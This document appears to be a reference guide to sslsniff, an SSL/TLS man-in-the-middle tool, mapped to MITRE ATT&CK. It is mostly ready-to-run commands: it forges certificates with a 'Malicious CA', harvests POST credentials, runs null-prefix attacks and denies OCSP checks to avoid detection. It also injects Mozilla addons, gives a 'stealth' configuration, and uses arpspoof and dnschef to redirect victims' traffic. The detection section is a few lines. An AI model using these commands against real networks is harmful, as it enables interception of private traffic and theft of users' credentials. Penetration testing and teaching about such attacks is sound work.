---
mitre_tactic: collection
mitre_tactic_id: TA0009
tool_name: sslsniff
tool_category: SSL/TLS MITM Attack
github: https://github.com/moxie0/sslsniff
version: 0.8
license: GPL-2.0
language: C++
---

# sslsniff - SSL/TLS Man-in-the-Middle Attack Tool

## Chapter 1: Overview

sslsniff is designed to create man-in-the-middle attacks for SSL/TLS connections, dynamically generating certificates for accessed domains. It supports certificate chain signing with any provided CA certificate and includes attacks like null-prefix and OCSP for silent interception.

**Core Function:** Perform SSL/TLS man-in-the-middle attacks with dynamic certificate generation

**Primary Use Cases:**
- SSL/TLS interception for security testing
- Certificate validation vulnerability testing
- Null-prefix certificate attacks
- OCSP-based silent interception
- Browser fingerprinting and targeted attacks
- Capturing encrypted web traffic

**Key Capabilities:**
- Dynamic certificate generation on-the-fly
- Certificate chain signing with custom CA
- Null-prefix certificate attacks
- OCSP request denial
- Browser-specific targeting (Firefox, IE, Safari, Opera, iOS)
- HTTP and HTTPS interception
- Mozilla Addon update interception

**Attack Modes:**
- **Authority Mode:** Use a CA certificate to sign all generated certs
- **Targeted Mode:** Use a directory of certificates to target specific domains

---

## Chapter 2: Installation

### Kali Linux (Default)

```bash
sudo apt install sslsniff
```

### From Source

```bash
git clone https://github.com/moxie0/sslsniff.git
cd sslsniff
./configure
make
sudo make install
```

### Dependencies

- OpenSSL (SSL/TLS operations)
- Boost (filesystem, threading)
- log4cpp (logging)

### Verify Installation

```bash
sslsniff -h
```

### Generate CA Certificate

```bash
# Generate CA key
openssl genrsa -out ca.key 2048

# Generate CA certificate
openssl req -new -x509 -key ca.key -out ca.crt -days 365 -subj "/CN=Fake CA"
```

---

## Chapter 3: Architecture and Operation

### Attack Flow

```
1. Client → sslsniff: HTTPS connection (ClientHello)
2. sslsniff → Server: Forward ClientHello
3. Server → sslsniff: ServerHello + Certificate
4. sslsniff: Generate forged certificate using CA
5. sslsniff → Client: Forged certificate (signed by attacker CA)
6. Client → sslsniff: Encrypted request (using forged cert)
7. sslsniff: Decrypt, log, re-encrypt
8. sslsniff → Server: Forward request
```

### MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Man-in-the-Middle | T1557 | Intercept communications |
| Forge Web Certificates | T1553.004 | Forge SSL certificates |
| Network Sniffing | T1040 | Capture network traffic |

### Certificate Generation

```
┌─────────────────────────────────────────────────────────────────┐
│                sslsniff Certificate Process                      │
├─────────────────────────────────────────────────────────────────┤
│  1. Receive ClientHello with target domain                      │
│  2. Connect to real server, get original certificate            │
│  3. Generate new certificate matching original properties       │
│  4. Sign with attacker CA certificate                           │
│  5. Return forged certificate to client                         │
│  6. Client trusts forged cert (if CA is trusted)                │
└─────────────────────────────────────────────────────────────────┘
```

---

## Chapter 4: Command Reference

### Basic Authority Mode

```bash
sslsniff -a -c ca.crt -s 443 -w output.log
```

**Explanation:** Start sslsniff in authority mode, using ca.crt as CA, listening on port 443, logging to output.log.

### With Certificate Chain

```bash
sslsniff -a -c ca.crt -m intermediate.crt -s 443 -w output.log
```

**Explanation:** Include intermediate certificate in the chain.

### Targeted Mode

```bash
sslsniff -t /path/to/certs/ -s 443 -w output.log
```

**Explanation:** Use directory of pre-generated certificates for targeted domains.

### HTTP Interception

```bash
sslsniff -a -c ca.crt -s 443 -h 8080 -w output.log
```

**Explanation:** Also intercept HTTP traffic on port 8080 for fingerprinting.

### Browser Filtering

```bash
# Firefox only
sslsniff -a -c ca.crt -s 443 -f ff -w output.log

# Multiple browsers
sslsniff -a -c ca.crt -s 443 -f ff,ie,safari -w output.log

# All browsers
sslsniff -a -c ca.crt -s 443 -f ff,ie,safari,opera -w output.log
```

**Explanation:** Only intercept requests from specified browsers.

### Deny OCSP Requests

```bash
sslsniff -a -c ca.crt -s 443 -d -w output.log
```

**Explanation:** Deny OCSP requests for forged certificates to prevent revocation checking.

### Log POST Requests Only

```bash
sslsniff -a -c ca.crt -s 443 -p -w output.log
```

**Explanation:** Only log HTTP POST requests (useful for credential capture).

### Mozilla Addon Interception

```bash
sslsniff -a -c ca.crt -s 443 -e https://addons.mozilla.org -j sha256_hash -w output.log
```

**Explanation:** Intercept Mozilla addon update requests and inject custom addon.

### Firefox Update Location

```bash
sslsniff -a -c ca.crt -s 443 -u /path/to/firefox_update.xml -w output.log
```

**Explanation:** Specify Firefox XML update file location for interception.

---

## Chapter 5: Advanced Attack Scenarios

### Scenario 1: Credential Harvesting

**Setup:**

```bash
# Generate CA
openssl genrsa -out ca.key 2048
openssl req -new -x509 -key ca.key -out ca.crt -days 365 -subj "/CN=Malicious CA"

# Start sslsniff
sslsniff -a -c ca.crt -s 443 -p -w credentials.log

# Redirect traffic to sslsniff (requires network positioning)
```

**Explanation:** Capture HTTP POST credentials from encrypted connections.

### Scenario 2: OCSP Attack

**Setup:**

```bash
# Start sslsniff with OCSP denial
sslsniff -a -c ca.crt -s 443 -d -w ocsp_attack.log

# The -d flag denies OCSP requests, preventing certificate revocation checking
```

**Explanation:** Deny OCSP requests to prevent detection of forged certificates.

### Scenario 3: Null-Prefix Certificate Attack

**Setup:**

```bash
# Generate certificate with null prefix in CN
# (Requires specialized CA with null-prefix support)
sslsniff -a -c null_prefix_ca.crt -s 443 -w null_prefix.log

# Exploit vulnerability in certificate validation
```

**Explanation:** Exploit null-prefix vulnerabilities in certificate validation.

### Scenario 4: Targeted Domain Attack

**Setup:**

```bash
# Prepare certificate directory
mkdir certs/
cp target.com.crt certs/
cp target.com.key certs/

# Start targeted mode
sslsniff -t certs/ -s 443 -w targeted.log
```

**Explanation:** Use pre-generated certificates for specific target domains.

---

## Chapter 6: Detection and Evasion

### Detection Methods

- **Certificate Transparency:** Monitor for unexpected certificate issuances
- **OCSP Stapling:** Check for OCSP responses
- **Certificate Pinning:** Verify against pinned certificates
- **Network Analysis:** Detect proxy connections

### Evasion Techniques

1. **OCSP Denial:** Use `-d` flag to prevent revocation checking
2. **Browser Targeting:** Use `-f` to target specific browsers
3. **Certificate Chain:** Use `-m` for intermediate certificates
4. **Custom CA:** Use well-known CA names for trust

### Stealth Configuration

```bash
# Deny OCSP and target specific browser
sslsniff -a -c ca.crt -s 443 -d -f ff -w stealth.log

# Minimal logging
sslsniff -a -c ca.crt -s 443 -p -w minimal.log
```

---

## Chapter 7: Integration with Other Tools

### Network Positioning

```bash
# Requires network positioning (ARP spoofing, DNS spoofing, etc.)
# Example with arpspoof
arpspoof -i eth0 -t target.local gateway_ip

# Example with dnschef
dnschef --fakeip attacker_ip --fake domains=facebook.com
```

### SSLStrip Integration

```bash
# Combine with sslstrip for HTTP downgrade
sslstrip -l 10000 &
sslsniff -a -c ca.crt -s 443 -w combined.log
```

### Metasploit Integration

```bash
# Use sslsniff during exploitation
# Requires network positioning via Metasploit
```

### Wireshark Analysis

```bash
# Capture traffic for analysis
tcpdump -i eth0 -w sslsniff_traffic.pcap port 443
```

---

## Chapter 8: Troubleshooting

### Common Issues

**Issue:** Certificate not accepted by client

```bash
# Ensure CA is trusted by client
# Install ca.crt in browser/system trust store

# For Firefox
# Settings > Privacy & Security > Certificates > View Certificates
# Import ca.crt
```

**Issue:** Connection fails after interception

```bash
# Check certificate generation
sslsniff -a -c ca.crt -s 443 -w debug.log 2>&1 | tee sslsniff_debug.log

# Verify CA certificate
openssl x509 -in ca.crt -text -noout
```

**Issue:** OCSP requests leaking

```bash
# Deny OCSP requests
sslsniff -a -c ca.crt -s 443 -d -w ocsp_denied.log
```

**Issue:** Browser not being intercepted

```bash
# Check browser fingerprinting
sslsniff -a -c ca.crt -s 443 -h 8080 -w fingerprint.log

# Verify browser user-agent
grep "User-Agent" fingerprint.log
```

### Debug Mode

```bash
sslsniff -a -c ca.crt -s 443 -w debug.log 2>&1 | tee sslsniff_full.log
```

### Verify CA Certificate

```bash
# Check CA certificate details
openssl x509 -in ca.crt -text -noout

# Verify certificate chain
openssl verify -CAfile ca.crt generated.crt
```

---

## Resources

- **GitHub:** https://github.com/moxie0/sslsniff
- **Kali Documentation:** https://www.kali.org/tools/sslsniff/
- **Moxie Marlinspike Presentations:** https://www.blackhat.com/presentations.html
- **SSL/TLS Security:** https://www.howsmyssl.com/
- **Certificate Tools:** https://www.ssllabs.com/
